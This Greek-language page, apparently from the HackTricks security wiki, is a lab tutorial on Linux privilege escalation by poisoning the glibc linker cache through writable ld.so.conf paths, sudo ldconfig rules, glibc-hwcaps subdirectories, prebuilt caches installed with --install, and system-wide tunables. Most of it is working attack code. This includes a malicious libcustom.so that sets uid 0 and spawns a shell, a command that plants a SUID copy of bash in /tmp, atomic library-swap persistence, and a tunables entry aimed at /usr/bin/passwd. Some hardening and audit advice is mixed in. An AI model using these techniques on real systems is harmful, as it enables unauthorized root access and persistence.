# Παράδειγμα exploit για privesc μέσω ld.so

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα είναι ένα στοχευμένο lab για poisoning του **system linker cache μέσω των `/etc/ld.so.conf` ή `ldconfig`**. Για missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` και άλλες generic καταχρήσεις linker από SUID, δείτε το [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Προετοιμασία του περιβάλλοντος

Στην παρακάτω ενότητα μπορείτε να βρείτε τον κώδικα των αρχείων που θα χρησιμοποιήσουμε για την προετοιμασία του περιβάλλοντος.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Δημιούργησε** αυτά τα αρχεία στο machine σου, στον ίδιο φάκελο
2. **Κάνε compile τη** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Αντέγραψε** το `libcustom.so` στο `/usr/lib` και κάνε refresh το cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Κάνε compile το** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Έλεγχος του environment

Έλεγξε ότι το _libcustom.so_ γίνεται **loaded** από το _/usr/lib_ και ότι μπορείς να **εκτελέσεις** το binary.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Χρήσιμες εντολές triage

Κατά την επίθεση σε έναν πραγματικό στόχο, επαληθεύστε το **ακριβές όνομα της βιβλιοθήκης** που χρειάζεται το binary, τι **επιλύει αυτήν τη στιγμή ο loader** και ποιες ρυθμισμένες διαδρομές είναι εγγράψιμες χωρίς να τροποποιήσετε την ενεργή cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Χρησιμοποίησε το `ldd` μόνο σε ένα **trusted** executable. Ορισμένες υλοποιήσεις ή ασυνήθιστοι ELF interpreters μπορεί να προκαλέσουν την εκτέλεση code που ελέγχεται από attacker· το `objdump -p ./file | grep NEEDED` εμφανίζει με ασφάλεια τις direct dependencies. Για ένα trusted target, η εκτέλεση του interpreter που εντοπίστηκε με `--list` εμφανίζει την πραγματική επίλυση. Σύγκρινε αυτή την έξοδο με την έξοδο του `--inhibit-cache --list`: μια διαφορά αποδεικνύει ότι το `/etc/ld.so.cache`, και όχι ένας συνηθισμένος κανόνας search path, επέλεξε το object.<sup>[[1]](#references)[[4]](#references)</sup>

Μερικές χρήσιμες παγίδες:

- Το `sudo echo ... > /etc/ld.so.conf.d/x.conf` συνήθως **δεν λειτουργεί**, επειδή
η ανακατεύθυνση εκτελείται από το τρέχον shell. Χρησιμοποίησε
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` αντί αυτού.
- Τα **SUID/privileged** binaries εκτελούνται σε **secure-execution mode**: το `LD_LIBRARY_PATH`
αγνοείται, ενώ το `LD_PRELOAD` υπόκειται σε περιορισμούς (ονόματα που περιέχουν
κάθετο αγνοούνται και μπορούν να γίνουν preload μόνο libraries με setuid-marked
χαρακτηριστικό σε standard directories). Μόλις το root εκτελέσει το `ldconfig`,
οι directories που αναφέρονται στο `/etc/ld.so.conf` μπορούν να εισαχθούν στο
`/etc/ld.so.cache`, επομένως αυτή η misconfiguration μπορεί και πάλι να επηρεάσει
privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- Το `LD_DEBUG` επίσης αγνοείται σε secure-execution mode, εκτός αν υπάρχει το `/etc/suid-debug`, επομένως
συγκέντρωσε το trace από ένα αντίστοιχο non-SUID run αντί να περιμένεις έξοδο από την privileged εκτέλεση.<sup>[[1]](#references)</sup>
- Στα glibc 2.33 και νεότερα, ο dynamic loader παρέχει επίσης το
`--list-diagnostics`, το οποίο εμφανίζει machine-readable diagnostics του loader και
πληροφορίες για τα built-in search paths όταν ένα hijack δεν συμπεριφέρεται όπως αναμένεται.<sup>[[1]](#references)[[6]](#references)</sup>

### Περιορισμοί Cache και SONAME

Το `ldconfig` δεν αποθηκεύει στο cache κάθε αυθαίρετο αρχείο σε έναν configured directory: εξετάζει ELF headers, αναγνωρίζει ονόματα που ταιριάζουν με `lib*.so*` ή `ld-*.so*` και αναμένει τη συμβατική αλυσίδα `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Επομένως, το injected object πρέπει να διαθέτει τη σωστή architecture/class για το target, το ακριβές όνομα `DT_NEEDED` (συνήθως το `DT_SONAME`) και όλα τα symbols/versions που επιλύει το victim.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Προτίμησε μια βιβλιοθήκη ειδικά για τον στόχο, όπως σε αυτό το παράδειγμα. Η σκίαση ενός συνηθισμένου SONAME με ένα ελλιπές object μπορεί να διακόψει κάθε process που το επιλύει πριν εκτελεστεί ο προοριζόμενος privileged στόχος.<sup>[[3]](#references)</sup>

### Persistence σε cached paths και atomic swaps

Το cache καταγράφει μια αντιστοίχιση **ονόματος βιβλιοθήκης προς pathname**· δεν ενσωματώνει το shared object. Αφού αποθηκευτεί στο cache ένα pathname που ελέγχεται από attacker, η αντικατάσταση του object στην ίδια ακριβώς διαδρομή επηρεάζει τα νέα processes που ξεκινούν χωρίς νέα εκτέλεση του `ldconfig`. Αυτό επιτρέπει ένα χρήσιμο μοτίβο time-of-check/time-of-use: παρουσίασε μια έγκυρη βιβλιοθήκη κατά την αναδημιουργία ή επιθεώρηση του cache από administrator και, στη συνέχεια, κάνε atomically rename το payload πάνω από αυτήν. Τα υπάρχοντα processes διατηρούν το object που έχουν ήδη κάνει map.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Likewise, η διαγραφή της κακόβουλης γραμμής από το `ld.so.conf` δεν απομακρύνει από μόνη της μια ήδη εγγεγραμμένη καταχώριση: ο διαχειριστής πρέπει να αφαιρέσει το μη αξιόπιστο αντικείμενο, να διορθώσει την ιδιοκτησία/πρόσβαση εγγραφής και να ανακατασκευάσει το cache. Χρησιμοποιήστε τη σύγκριση `--inhibit-cache` παραπάνω για να διακρίνετε μια παλιά καταχώριση cache από μια διαδρομή ρυθμίσεων που εξακολουθεί να είναι ενεργή.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Σε αυτό το σενάριο, υποθέστε ότι ένας διαχειριστής έχει προσθέσει μια ευάλωτη καταχώριση σε ένα
αρχείο μέσα στο `/etc/ld.so.conf.d/`, το οποίο συμπεριλαμβάνεται από το
`/etc/ld.so.conf` του συστήματος.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ο ευάλωτος φάκελος είναι _/home/ubuntu/lib_ (όπου έχουμε πρόσβαση εγγραφής).\
**Κατεβάστε και κάντε compile** τον ακόλουθο κώδικα μέσα σε αυτήν τη διαδρομή:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Αν αναμένετε ότι το **root** (ή ένας άλλος προνομιούχος λογαριασμός) θα εκτελέσει αργότερα το ευάλωτο binary, συνήθως είναι προτιμότερο να αφήσετε ένα **root-owned artifact** αντί να εκκινήσετε ένα interactive shell. Για παράδειγμα:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Έπειτα, αφού πραγματοποιηθεί η εκτέλεση με προνομιακά δικαιώματα, μπορείτε να χρησιμοποιήσετε το `/tmp/rootbash -p`.

Τώρα που έχουμε **δημιουργήσει τη malicious libcustom library μέσα στη λανθασμένα ρυθμισμένη** διαδρομή, η προεπιλεγμένη cache πρέπει να αναδημιουργηθεί μέσω μιας επιτυχούς εκτέλεσης του προνομιακού **`ldconfig`**. Η επανεκκίνηση βοηθά μόνο όταν η τοπική διαδικασία εκκίνησης την καλεί πράγματι· διαφορετικά, περιμένετε την ενέργεια ενός διαχειριστή ή χρησιμοποιήστε έναν μη ασφαλή κανόνα sudo, εάν υπάρχει διαθέσιμος.<sup>[[2]](#references)</sup>

Μόλις αυτό συμβεί, **ελέγξτε ξανά** από πού φορτώνει το εκτελέσιμο `sharedvuln` τη βιβλιοθήκη `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Όπως μπορείτε να δείτε, **το φορτώνει από `/home/ubuntu/lib`** και αν οποιοσδήποτε χρήστης το εκτελέσει, θα εκτελεστεί ένα shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Σημειώστε ότι σε αυτό το παράδειγμα δεν έχουμε κάνει privilege escalation, αλλά τροποποιώντας τις εντολές που εκτελούνται και **περιμένοντας από τον root ή άλλον privileged user να εκτελέσει το ευάλωτο binary**, θα μπορέσουμε να κάνουμε privilege escalation.

### Σύγχρονο `glibc-hwcaps` shadowing

Από το glibc 2.33, ο loader μπορεί να προτιμά βελτιστοποιημένες βιβλιοθήκες κάτω από το `glibc-hwcaps/<level>/` μέσα σε **κάθε directory αναζήτησης βιβλιοθηκών**. Κατά συνέπεια, ο έλεγχος μόνο του `/home/ubuntu/lib` δεν επαρκεί: ένας εγγράψιμος συμβατός υποκατάλογος, όπως ο `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/`, μπορεί να κάνει shadow τη βασική βιβλιοθήκη αφού το `ldconfig` τον καταχωρίσει, ενώ άλλες CPUs συνεχίζουν να χρησιμοποιούν το βασικό object. Αυτό παρέχει επίσης ένα architecture-selective hijack, το οποίο μπορεί να μην εντοπιστεί όταν η validation πραγματοποιείται σε διαφορετική CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Η τρέχουσα guidance για το hardening του glibc συνιστά την αποφυγή duplicate SONAMEs, non-default search locations και objects σε `glibc-hwcaps` subdirectories. Από audit perspective, εφαρμόστε recursively ownership και writeability checks στους configured directories και σε όλα τα parent path components.<sup>[[3]](#references)</sup>

### Other misconfigurations - Same vuln

Στο προηγούμενο example πλαστογραφήσαμε μια misconfiguration, όπου ένας administrator **όρισε έναν non-privileged folder μέσα σε ένα configuration file στο `/etc/ld.so.conf.d/`**.\
Ωστόσο, υπάρχουν και άλλες misconfigurations που μπορούν να προκαλέσουν την ίδια vulnerability: αν έχετε **write permissions** σε ένα loaded **config file**, μπορείτε να δημιουργήσετε ένα file σε έναν writable `/etc/ld.so.conf.d/` directory ή μπορείτε να γράψετε στο `/etc/ld.so.conf`, μπορείτε να ρυθμίσετε και να εκμεταλλευτείτε την ίδια vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Ας υποθέσουμε ότι έχετε sudo privileges στο `ldconfig`**. Το `ldconfig` δέχεται scan directories ως positional arguments, επομένως η συντομότερη μορφή cache-poisoning συχνά είναι απλώς:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Εναλλακτικά, το `-f` επιλέγει ένα άλλο αρχείο ρυθμίσεων, διατηρώντας παράλληλα την προεπιλεγμένη έξοδο cache. Αυτό είναι χρήσιμο όταν ένα φίλτρο ορισμάτων αποκλείει καταλόγους που δίνονται ως positional arguments, αλλά εξακολουθεί να επιτρέπει το `-f`, ή όταν πρέπει να εισαχθούν πολλές διαδρομές:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Τώρα, όπως υποδεικνύεται στο **previous exploit**, **δημιούργησε την κακόβουλη βιβλιοθήκη μέσα στο `/tmp`**.\
Και τέλος, ας φορτώσουμε το path και ας ελέγξουμε από πού φορτώνει το binary τη βιβλιοθήκη:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Όπως μπορείτε να δείτε, έχοντας sudo privileges για το `ldconfig`, μπορείτε να εκμεταλλευτείτε την ίδια ευπάθεια.** Οι λεπτομέρειες των options είναι σημαντικές κατά την αξιολόγηση ενός περιορισμένου sudo rule: το `-f` επιλέγει διαφορετικό configuration, αλλά εξακολουθεί να αναδημιουργεί το `/etc/ld.so.cache`; το `-C` ανακατευθύνει το cache αλλού· το `-N` αποτρέπει την αναδημιουργία του cache· και το `-X` αποτρέπει τις ενημερώσεις των links, αλλά **εξακολουθεί να αναδημιουργεί το cache, εκτός αν συνδυαστεί με το `-N`**. Το `-n` συνεπάγεται `-N`, επομένως μπορεί να ενημερώνει links στους παρεχόμενους καταλόγους, αλλά δεν μπορεί να κάνει poison το cache· το `-r` λειτουργεί κάτω από ένα alternate root και κανονικά δεν αλλάζει το cache του host.<sup>[[2]](#references)</sup>

### glibc 2.44: εγκατάσταση ενός prebuilt cache

Το Glibc 2.44 πρόσθεσε το `ldconfig --install SOURCE`, το οποίο αντιγράφει ατομικά ένα prebuilt cache στον επιλεγμένο προορισμό cache (το `/etc/ld.so.cache` του host, εκτός αν τα `-C` ή `-r` το αλλάξουν). Αυτό δημιουργεί ένα ακόμη επικίνδυνο argument για sudoers rules και privileged wrappers: ένας attacker μπορεί να κατασκευάσει ένα valid cache **χωρίς privileges** και, στη συνέχεια, να χρησιμοποιήσει την επιτρεπόμενη invocation του `--install` για να αντικαταστήσει το system cache. Η διαδρομή εγκατάστασης ελέγχει το magic του cache, αλλά δεν αναδημιουργεί τα entries του από trusted configuration.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
# Build a valid cache as the unprivileged user. -X avoids changing symlinks.
/sbin/ldconfig -X -f /dev/null -t /dev/null \
-C /tmp/evil.ld.so.cache /tmp
/sbin/ldconfig -p -C /tmp/evil.ld.so.cache | grep -F libcustom.so

# Dangerous when sudo permits ldconfig with attacker-selected arguments.
sudo /sbin/ldconfig --install /tmp/evil.ld.so.cache
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Το cache εξακολουθεί να περιέχει **pathnames**, όχι bytes βιβλιοθηκών, επομένως το `/tmp/libcustom.so` πρέπει να παραμένει διαθέσιμο και συμβατό όταν ξεκινά το victim. Τα filters που απλώς απορρίπτουν τα `-f`, positional directories ή `-t` είναι επομένως ελλιπή στο glibc 2.44: απορρίψτε επίσης τα `--install`/`-I` ή, κατά προτίμηση, μην κάνετε καθόλου delegate το `ldconfig`.<sup>[[9]](#references)[[10]](#references)</sup>

## glibc 2.44: cached tunables σε επίπεδο συστήματος

Από το glibc 2.44, το `ldconfig` αναλύει επίσης το `/etc/tunables.conf` και αποθηκεύει τις ρυθμίσεις του ως extension στο `/etc/ld.so.cache`. Το αρχείο δέχεται οδηγίες `include` και per-process filters. Τα prefixes ελέγχουν το scope: τα `@`/`onlysecure` στοχεύουν μόνο διεργασίες `AT_SECURE`, τα `$`/`nonsecure` τις εξαιρούν, ενώ τα `*`/`anysecure` καλύπτουν και τις δύο κατηγορίες. **Μια καταχώριση χωρίς prefix στοχεύει από προεπιλογή non-secure διεργασίες**, επομένως ένας attacker πρέπει να χρησιμοποιήσει ρητά το `@` ή το `*` για να επηρεάσει προγράμματα setuid, setgid ή capability-elevated. Αυτό διευρύνει το audit boundary πέρα από τους καταλόγους βιβλιοθηκών: μια writable tunables configuration ή ένα included file μπορεί να επηρεάσει μελλοντικά program startups μετά από privileged cache rebuild.<sup>[[7]](#references)[[9]](#references)</sup>

Η ίδια έκδοση προσθέτει το `ldconfig -t TUNCONF`, το οποίο επιλέγει ένα alternate tunables file, συνεχίζοντας όμως να γράφει το normal cache, εκτός αν κάποια άλλη option το αλλάξει. Επομένως, wrappers και sudo rules που επιχειρούσαν να αποκλείσουν μόνο το `-f` πρέπει επίσης να απορρίπτουν τα `-t`, arbitrary positional directories, `--install` και κάθε χειρισμό του cache output.<sup>[[7]](#references)[[8]](#references)[[10]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
### Tunables που επιλέγονται ανά στόχο

Το φίλτρο `[proc:PATTERN]` εφαρμόζει τις ακόλουθες καταχωρίσεις μόνο όταν η πλήρης διαδρομή `/proc/self/exe` του executable (αν το `PATTERN` ξεκινά με `/`) ή το basename ταιριάζει. Ένα φίλτρο ολοκληρώνεται στο επόμενο φίλτρο, στο `[]`, στο τέλος του αρχείου ή στα όρια ενός include-file. Αυτό κάνει ένα poisoned cache λιγότερο θορυβώδες, επειδή η τροποποιημένη συμπεριφορά μπορεί να περιοριστεί σε ένα privileged victim.<sup>[[7]](#references)</sup>
```ini
# Affect only this AT_SECURE executable; "-" also forbids env overrides.
[proc:/usr/bin/passwd]
-@glibc.malloc.check=3
[]
```
Το πρόθεμα `-`/`nonoverridable` αποτρέπει την παράκαμψη μιας cached τιμής από το `GLIBC_TUNABLES`, ενώ το `+`/`overridable` επαναφέρει την κανονική συμπεριφορά override. Για διεργασίες `AT_SECURE`, η environment variable αγνοείται εξ ολοκλήρου ούτως ή άλλως. Αντιμετωπίστε τη μορφή του αρχείου ως version-specific — το project glibc δεν τη διασφαλίζει ως stable interface — και απαριθμήστε τα υποστηριζόμενα names και values με `"$interp" --list-tunables` πριν επιχειρήσετε στοχευμένο effect.<sup>[[7]](#references)[[9]](#references)</sup>

Αυτό δεν αποτελεί αυτομάτως arbitrary code execution. Είναι ένα privileged **loader-behavior manipulation** primitive: το glibc προειδοποιεί ρητά ότι system-wide values μπορούν να εφαρμόσουν security-sensitive tunables σε προγράμματα setuid/setgid χωρίς per-tunable security screening. Αναζητήστε target-specific αλλαγές στον allocator, αλλαγές στο CPU-hardening ή συνθήκες denial-of-service, αντί να υποθέσετε ένα universal payload.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Hardening του Dynamic Linker - Η GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Διαγνωστικά Dynamic Linker (Η GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (Η GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Προσθήκη system-wide tunables: τμήμα ldconfig (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
- [9] [Η GNU C Library έκδοση 2.44 είναι πλέον διαθέσιμη](https://sourceware.org/pipermail/libc-alpha/2026-July/179159.html)
- [10] [Πηγαίος κώδικας glibc 2.44 ldconfig](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;hb=glibc-2.44)
{{#include ../../banners/hacktricks-training.md}}
